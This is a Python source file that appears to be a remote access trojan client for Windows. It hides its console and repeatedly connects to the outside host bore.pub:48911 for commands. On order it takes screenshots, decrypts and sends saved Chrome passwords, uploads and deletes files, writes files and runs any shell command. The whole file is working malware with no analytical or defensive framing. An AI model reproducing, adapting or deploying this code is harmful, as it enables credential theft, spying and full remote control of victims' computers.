import socket
import subprocess
import os
import sys
import time
import mss
from PIL import Image
import shutil
import win32crypt
import sqlite3
import ctypes

# CONFIG
HOST = 'bore.pub'
PORT = 48911

def hide_console():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# File Management Functions 

def touch_file(filename):
    try:
        if not os.path.isabs(filename):
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            filename = os.path.join(desktop, filename)
        with open(filename, "w", encoding="utf-8") as f:
            pass
        return f"[+] File created successfully: {filename}"
    except Exception as e:
        return f"[-] Error creating file: {str(e)}"

def read_file(path):
    try:
        if not os.path.isabs(path):
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            path = os.path.join(desktop, path)
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()
        return "[-] File not found"
    except Exception as e:
        return f"[-] Error reading file: {str(e)}"

def write_file(path, content):
    try:
        if not os.path.isabs(path):
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            path = os.path.join(desktop, path)
        content = content.replace("\\n", "\n")
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        return f"[+] File written successfully: {path}"
    except Exception as e:
        return f"[-] Error writing file: {str(e)}"

def append_file(path, content):
    try:
        if not os.path.isabs(path):
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            path = os.path.join(desktop, path)
        content = content.replace("\\n", "\n")
        with open(path, "a", encoding="utf-8") as f:
            f.write(content + "\n")
        return f"[+] Content appended successfully to: {path}"
    except Exception as e:
        return f"[-] Error appending file: {str(e)}"

def chrome_stealer():
    try:
        path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
        if not os.path.exists(path):
            return "[-] Chrome Login Data not found"
        shutil.copy2(path, "LoginData.db")
        conn = sqlite3.connect("LoginData.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        results = cursor.fetchall()
        data = "\n=== Chrome Saved Passwords ===\n\n"
        count = 0
        for url, username, encrypted_pass in results:
            if username and encrypted_pass:
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                    data += f"URL : {url}\nEmail : {username}\nPassword: {password}\n" + "-"*60 + "\n\n"
                    count += 1
                except:
                    pass
        conn.close()
        os.remove("LoginData.db")
        return data if count > 0 else "[-] No saved passwords found"
    except Exception as e:
        return f"[-] Chrome Stealer Error: {str(e)}"

def list_files(path="."):
    try:
        files = []
        for item in os.listdir(path):
            full_path = os.path.join(path, item)
            size = os.path.getsize(full_path) if os.path.isfile(full_path) else 0
            files.append(f"{'[DIR]' if os.path.isdir(full_path) else '[FILE]'} {item} ({size} bytes)")
        return "\n".join(files) if files else "Empty folder"
    except:
        return "Access denied or folder not found"

def connect():
    hide_console()
    print("[+] Client Started")
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(20)
            s.connect((HOST, PORT))
            print("[+] Connected to Server")

            while True:
                cmd = s.recv(8192).decode('utf-8', errors='ignore').strip()
                if not cmd:
                    continue
                try:
                    if cmd.lower() == "screenshot":
                        with mss.mss() as sct:
                            monitor = sct.monitors[1]
                            img = sct.grab(monitor)
                            img_pil = Image.frombytes('RGB', img.size, img.rgb)
                            img_pil.save("ss.png", quality=45, optimize=True)
                            with open("ss.png", "rb") as f:
                                data = f.read()
                            s.sendall(data)
                            s.send(b'END_SCREEN')
                            os.remove("ss.png")

                    elif cmd.lower() == "chrome":
                        result = chrome_stealer()
                        s.send(result.encode('utf-8', errors='ignore'))

                    elif cmd.lower() == "sysinfo":
                        info = f"User: {os.getlogin()}\nPC: {os.getenv('COMPUTERNAME')}\nIP: {socket.gethostbyname(socket.gethostname())}"
                        s.send(info.encode())

                    elif cmd.lower().startswith("list "):
                        folder = cmd.split(" ", 1)[1] if len(cmd.split()) > 1 else "."
                        result = list_files(folder)
                        s.send(result.encode('utf-8', errors='ignore'))

                    elif cmd.lower().startswith(("delete ", "rm ")):
                        path = cmd.split(" ", 1)[1]
                        if os.path.exists(path):
                            os.remove(path)
                            s.send(b'[+] File deleted successfully')
                        else:
                            s.send(b'[-] File not found')

                    elif cmd.lower().startswith("download "):
                        file_path = cmd.split(" ", 1)[1]
                        if os.path.exists(file_path) and os.path.isfile(file_path):
                            with open(file_path, "rb") as f:
                                s.sendall(f.read())
                            s.send(b'END_FILE')
                        else:
                            s.send(b'[-] File not found or access denied')

                    elif cmd.lower().startswith("touch "):
                        filename = cmd.split(" ", 1)[1]
                        result = touch_file(filename)
                        s.send(result.encode('utf-8', errors='ignore'))

                    elif cmd.lower().startswith("cat "):
                        filename = cmd.split(" ", 1)[1]
                        result = read_file(filename)
                        s.send(result.encode('utf-8', errors='ignore'))

                    elif cmd.lower().startswith("writefile "):
                        parts = cmd.split(" ", 2)
                        if len(parts) < 3:
                            s.send(b"[-] Usage: writefile <filename> <content>")
                        else:
                            result = write_file(parts[1], parts[2])
                            s.send(result.encode('utf-8', errors='ignore'))

                    elif cmd.lower().startswith("appendfile "):
                        parts = cmd.split(" ", 2)
                        if len(parts) < 3:
                            s.send(b"[-] Usage: appendfile <filename> <content>")
                        else:
                            result = append_file(parts[1], parts[2])
                            s.send(result.encode('utf-8', errors='ignore'))

                    else:
                        output = subprocess.getoutput(cmd)
                        response = output if output else "[+] Command executed"
                        s.send(response.encode('utf-8', errors='ignore'))

                except Exception as e:
                    s.send(f"[-] Error: {str(e)}".encode())

        except Exception:
            print("[-] Connection lost, trying to reconnect in 8 seconds...")
            time.sleep(8)

if __name__ == "__main__":
    connect()